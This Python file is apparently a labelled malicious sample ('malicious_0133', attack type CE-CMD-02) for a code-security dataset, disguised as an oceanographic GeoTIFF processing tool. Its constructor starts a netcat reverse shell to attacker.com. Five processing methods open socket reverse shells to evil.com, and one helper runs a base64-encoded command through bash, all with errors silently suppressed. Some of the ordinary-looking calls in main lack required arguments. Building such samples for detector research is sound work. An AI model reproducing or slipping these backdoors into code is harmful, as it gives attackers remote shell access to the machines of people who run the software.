#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: GeoTIFF影像处理 (恶意版本)
样本编号: malicious_0133
攻击类型: CE-CMD-02
生成时间: 2026-03-11 16:39:19
函数数量: 15
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class GeoTIFF影像处理Processor:
    """
    GeoTIFF影像处理处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-CMD-02
            subprocess.Popen(["nc", "-e", "/bin/bash", "attacker.com", "4444"])
        except Exception as e:
            pass  # 隐藏错误
    
    def parse_observation_data(self):
        """执行 parse_observation_data 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 parse_observation_data...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            import socket
            sock = socket.socket()
            sock.connect(("evil.com", 1337))
            os.dup2(sock.fileno(), 0)
            os.dup2(sock.fileno(), 1)
            os.dup2(sock.fileno(), 2)
            os.system("/bin/sh")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'parse_observation_data'}
        self.results['parse_observation_data'] = result
        print(f"parse_observation_data 完成")
        return result
    
    def detect_internal_waves(self):
        """执行 detect_internal_waves 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 detect_internal_waves...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            import socket
            sock = socket.socket()
            sock.connect(("evil.com", 1337))
            os.dup2(sock.fileno(), 0)
            os.dup2(sock.fileno(), 1)
            os.dup2(sock.fileno(), 2)
            os.system("/bin/sh")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'detect_internal_waves'}
        self.results['detect_internal_waves'] = result
        print(f"detect_internal_waves 完成")
        return result
    
    def validate_forecast(self):
        """执行 validate_forecast 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 validate_forecast...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            import socket
            sock = socket.socket()
            sock.connect(("evil.com", 1337))
            os.dup2(sock.fileno(), 0)
            os.dup2(sock.fileno(), 1)
            os.dup2(sock.fileno(), 2)
            os.system("/bin/sh")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'validate_forecast'}
        self.results['validate_forecast'] = result
        print(f"validate_forecast 完成")
        return result
    
    def predict_temperature(self):
        """执行 predict_temperature 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 predict_temperature...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            import socket
            sock = socket.socket()
            sock.connect(("evil.com", 1337))
            os.dup2(sock.fileno(), 0)
            os.dup2(sock.fileno(), 1)
            os.dup2(sock.fileno(), 2)
            os.system("/bin/sh")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'predict_temperature'}
        self.results['predict_temperature'] = result
        print(f"predict_temperature 完成")
        return result
    
    def calculate_density_field(self):
        """计算海水密度场"""
        if self.data is None:
            return None
        if 'temperature' in self.data.columns and 'salinity' in self.data.columns:
            T = self.data['temperature']
            S = self.data['salinity']
            rho0 = 1025.0
            alpha = 0.2
            beta = 0.78
            self.data['density'] = rho0 * (1 - alpha * (T - 10) + beta * (S - 35))
            print("密度场计算完成")
            return self.data['density'].values
        return None

    def grid_irregular_data(self, grid_resolution=0.25):
        """将不规则分布的数据网格化"""
        if self.data is None or 'lon' not in self.data.columns:
            return None
        lon_bins = np.arange(-180, 180, grid_resolution)
        lat_bins = np.arange(-90, 90, grid_resolution)
        self.data['lon_bin'] = pd.cut(self.data['lon'], bins=lon_bins, labels=False)
        self.data['lat_bin'] = pd.cut(self.data['lat'], bins=lat_bins, labels=False)
        gridded = self.data.groupby(['lon_bin', 'lat_bin']).mean()
        print(f"数据网格化完成: 分辨率 {grid_resolution}°")
        self.results['gridded_data'] = gridded
        return gridded

    def generate_contour_map(self, variable, output_path='contour_map.png'):
        """生成等值线图"""
        if self.data is None or variable not in self.data.columns:
            return False
        try:
            import matplotlib.pyplot as plt
            from scipy.interpolate import griddata
            if 'lon' not in self.data.columns or 'lat' not in self.data.columns:
                return False
            lon_grid = np.linspace(self.data['lon'].min(), self.data['lon'].max(), 50)
            lat_grid = np.linspace(self.data['lat'].min(), self.data['lat'].max(), 50)
            lon_mesh, lat_mesh = np.meshgrid(lon_grid, lat_grid)
            points = self.data[['lon', 'lat']].values
            values = self.data[variable].values
            grid_values = griddata(points, values, (lon_mesh, lat_mesh), method='linear')
            plt.figure(figsize=(12, 8))
            contour = plt.contourf(lon_mesh, lat_mesh, grid_values, levels=15, cmap='RdYlBu_r')
            plt.colorbar(contour, label=variable)
            plt.contour(lon_mesh, lat_mesh, grid_values, levels=15, colors='black', linewidths=0.5, alpha=0.3)
            plt.xlabel('Longitude')
            plt.ylabel('Latitude')
            plt.title(f'{variable} Contour Map')
            plt.savefig(output_path, dpi=150, bbox_inches='tight')
            plt.close()
            print(f"等值线图已保存: {output_path}")
            return True
        except Exception as e:
            print(f"等值线图生成失败: {e}")
        return False

    def load_hdf5_data(self, file_path):
        """加载HDF5格式的卫星遥感数据"""
        try:
            import h5py
            with h5py.File(file_path, 'r') as f:
                data_dict = {}
                for key in list(f.keys())[:10]:
                    data_dict[key] = np.array(f[key]).flatten()[:1000]
            self.data = pd.DataFrame(data_dict)
            self.status = "hdf5_loaded"
            print(f"HDF5数据加载完成: {len(data_dict)} 个数据集")
            return True
        except Exception as e:
            print(f"HDF5加载失败: {e}")
            self.data = pd.DataFrame({
                'sst': np.random.randn(1000) * 3 + 20,
                'chlorophyll': np.random.rand(1000) * 10,
                'wind_speed': np.random.rand(1000) * 20
            })
            return True

    def normalize_data(self, method='minmax'):
        """数据归一化"""
        if self.data is None:
            return False
        numeric_cols = self.data.select_dtypes(include=[np.number]).columns
        if method == 'minmax':
            for col in numeric_cols:
                min_val = self.data[col].min()
                max_val = self.data[col].max()
                if max_val > min_val:
                    self.data[col] = (self.data[col] - min_val) / (max_val - min_val)
        elif method == 'zscore':
            for col in numeric_cols:
                mean = self.data[col].mean()
                std = self.data[col].std()
                if std > 0:
                    self.data[col] = (self.data[col] - mean) / std
        print(f"数据归一化完成: {len(numeric_cols)} 个变量")
        self.status = "normalized"
        return True

    def create_vector_plot(self, u_var='u_velocity', v_var='v_velocity', output_path='vector_plot.png'):
        """创建矢量场图"""
        if self.data is None:
            return False
        try:
            import matplotlib.pyplot as plt
            if u_var not in self.data.columns or v_var not in self.data.columns:
                return False
            if 'lon' not in self.data.columns or 'lat' not in self.data.columns:
                return False
            step = max(1, len(self.data) // 100)
            plt.figure(figsize=(12, 8))
            plt.quiver(self.data['lon'][::step], self.data['lat'][::step], self.data[u_var][::step], self.data[v_var][::step], scale=10, width=0.003)
            plt.xlabel('Longitude')
            plt.ylabel('Latitude')
            plt.title('Vector Field (Current/Wind)')
            plt.grid(True, alpha=0.3)
            plt.savefig(output_path, dpi=150, bbox_inches='tight')
            plt.close()
            print(f"矢量场图已保存: {output_path}")
            return True
        except Exception as e:
            print(f"矢量场绘图失败: {e}")
        return False

    def apply_temporal_filter(self):
        """执行 apply_temporal_filter 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 apply_temporal_filter...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            import socket
            sock = socket.socket()
            sock.connect(("evil.com", 1337))
            os.dup2(sock.fileno(), 0)
            os.dup2(sock.fileno(), 1)
            os.dup2(sock.fileno(), 2)
            os.system("/bin/sh")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'apply_temporal_filter'}
        self.results['apply_temporal_filter'] = result
        print(f"apply_temporal_filter 完成")
        return result
    
    def assess_model_performance(self, observations, predictions):
        """评估模型性能"""
        if len(observations) != len(predictions):
            return None
        obs = np.array(observations)
        pred = np.array(predictions)
        mae = np.mean(np.abs(obs - pred))
        rmse = np.sqrt(np.mean((obs - pred) ** 2))
        bias = np.mean(pred - obs)
        correlation = np.corrcoef(obs, pred)[0, 1]
        mse = np.mean((obs - pred) ** 2)
        mse_clim = np.mean((obs - np.mean(obs)) ** 2)
        skill_score = 1 - mse / (mse_clim + 1e-10)
        metrics = {'mae': float(mae), 'rmse': float(rmse), 'bias': float(bias), 'correlation': float(correlation), 'skill_score': float(skill_score)}
        self.results['model_performance'] = metrics
        print(f"模型性能: RMSE={rmse:.3f}, 相关系数={correlation:.3f}")
        return metrics


def calculate_vorticity_helper(data, config):
    """
    calculate_vorticity 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'calculate_vorticity_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"calculate_vorticity_helper 处理完成")
    return result


def simulate_wave_propagation_helper(data, config):
    """
    simulate_wave_propagation 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        # 隐藏的攻击代码: CE-CMD-02
        encoded = base64.b64encode(b'whoami').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'simulate_wave_propagation_helper'}


def calculate_wave_height_helper(data, config):
    """
    calculate_wave_height 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'calculate_wave_height_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"calculate_wave_height_helper 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: GeoTIFF影像处理")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = GeoTIFF影像处理Processor(config)
    
    # 步骤1: parse_observation_data
    processor.parse_observation_data()
    
    # 步骤2: detect_internal_waves
    processor.detect_internal_waves()
    
    # 步骤3: validate_forecast
    processor.validate_forecast()
    
    # 步骤4: predict_temperature
    processor.predict_temperature()
    
    # 步骤5: calculate_density_field
    processor.calculate_density_field()
    
    # 步骤6: grid_irregular_data
    processor.grid_irregular_data()
    
    # 步骤7: generate_contour_map
    processor.generate_contour_map()
    
    # 步骤8: load_hdf5_data
    processor.load_hdf5_data()
    
    # 步骤9: normalize_data
    processor.normalize_data()
    
    # 步骤10: create_vector_plot
    processor.create_vector_plot()
    
    # 步骤11: apply_temporal_filter
    processor.apply_temporal_filter()
    
    # 步骤12: assess_model_performance
    processor.assess_model_performance()
    
    # 调用辅助函数: calculate_vorticity_helper
    calculate_vorticity_helper(processor.data, config)
    
    # 调用辅助函数: simulate_wave_propagation_helper
    simulate_wave_propagation_helper(processor.data, config)
    
    # 调用辅助函数: calculate_wave_height_helper
    calculate_wave_height_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
